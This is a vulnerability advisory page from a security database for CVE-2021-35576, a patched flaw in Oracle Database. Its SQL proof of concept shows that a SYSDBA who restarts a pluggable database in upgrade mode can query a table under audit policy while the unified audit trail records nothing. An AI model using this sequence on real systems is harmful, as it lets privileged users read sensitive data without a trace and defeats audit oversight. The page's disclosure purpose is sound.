---
title: Oracle Unified Audit Policy Bypass
url: https://cxsecurity.com/issue/WLB-2023010001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-03
fetch_date: 2025-10-04T02:53:57.360732
---

# Oracle Unified Audit Policy Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle Unified Audit Policy Bypass** **2023.01.02**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2021-35576](https://cxsecurity.com/cveshow/CVE-2021-35576/ "Click to see CVE-2021-35576")**  CWE: **[NVD-CWE-noinfo](https://cxsecurity.com/cwe/NVD-CWE-noinfo "NVD-CWE-noinfo")**  CVSS Base Score: **4/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **None**  Integrity impact: **Partial**  Availability impact: **None** | |

Title: CVE-2021-35576 – Oracle database system Unified Audit Policy ByPass
Product: Database
Manufacturer: Oracle
Affected Version(s): 12.1.0.2, 12.2.0.1, 19c
Tested Version(s): 19c
Risk Level: low
Solution Status: Fixed
Manufacturer Notification: 2021-03-17
Solution Date: 2021-10-17
Public Disclosure: 2022-06-11
CVE Reference: CVE-2021-35576
Author of Advisory: Emad Al-Mousa
Overview:
Oracle Database is a general purpose relational database management system (RDMBS).
Unified Auditing is the supported mechanism to capture database audit logs. The unified audit trail captures audit information from a variety of sources.The unified audit trail, which resides in a read-only table in the AUDSYS schema in the SYSAUX tablespace, makes this information available in a uniform format in the UNIFIED\_AUDIT\_TRAIL data dictionary view, and is available in both single-instance and Oracle Database Real Application Clusters environments. In addition to the user SYS, users who have been granted the AUDIT\_ADMIN and AUDIT\_VIEWER roles can query these views. If your users only need to query the views but not create audit policies, then grant them the AUDIT\_VIEWER role.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
The vulnerability will allow database administrator or system admin with access to the database server (either local login or remote authentication)to bypass a custom in-place audit policy defined in the oracle database system. Moreover, setting the database in upgrade mode will disable auditingand threat actor can perform malicious operations without detection.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
I will create a table in pluggable database PDB1 under HR schema and insert few records:
SQL> CREATE TABLE HR.EMPLOYEE
(
FIRST\_NAME VARCHAR2(50),
LAST\_NAME VARCHAR2(50)
);
SQL> INSERT INTO HR.EMPLOYEE (
FIRST\_NAME, LAST\_NAME)
VALUES ( 'EMAD','MOUSA' );
SQL> commit;
SQL> INSERT INTO HR.EMPLOYEE (
FIRST\_NAME, LAST\_NAME)
VALUES ( 'SAMI','MOUSA' );
SQL> commit;
I will now create audit policy:
SQL> CREATE AUDIT POLICY SELECT\_P1 actions select on HR.EMPLOYEE;
SQL> audit policy SELECT\_P1;
To check audit policies configured in PDB1 database:
SQL> SELECT \* FROM audit\_unified\_enabled\_policies;
Now, let us simulate executing the select statement against the monitored/audited table while database is in upgrade mode:
sqlplus / as sysdba
SQL> alter session set container=PDB1;
SQL> shutdown immediate;
SQL> startup upgrade;
SQL> select \* from HR.EMPLOYEE;
SQL> startup force;
SQL> exec SYS.DBMS\_AUDIT\_MGMT.FLUSH\_UNIFIED\_AUDIT\_TRAIL;
Checking the audit logs using the query, NO entry is found recorded in the unified audit trail:
SQL> select OS\_USERNAME,USERHOST,DBUSERNAME,CLIENT\_PROGRAM\_NAME,EVENT\_TIMESTAMP,ACTION\_NAME,OBJECT\_SCHEMA,OBJECT\_NAME,SQL\_TEXT from unified\_audit\_trail where OBJECT\_NAME=’EMPLOYEE’ order by EVENT\_TIMESTAMP desc;
So, even though audit policy was configured in the database a DBA/System Admin can view the audited sensitive table without a trace as No record will be populated in UNIFIED\_AUDIT\_TRAIL view !
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://www.oracle.com/security-alerts/cpuoct2021.html
https://databasesecurityninja.wordpress.com/2022/06/11/cve-2021-35576-bypassing-unified-audit-policy/
https://nvd.nist.gov/vuln/detail/CVE-2021-35576
Credit:
Emad Al-Mousa: CVE-2021-35576

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top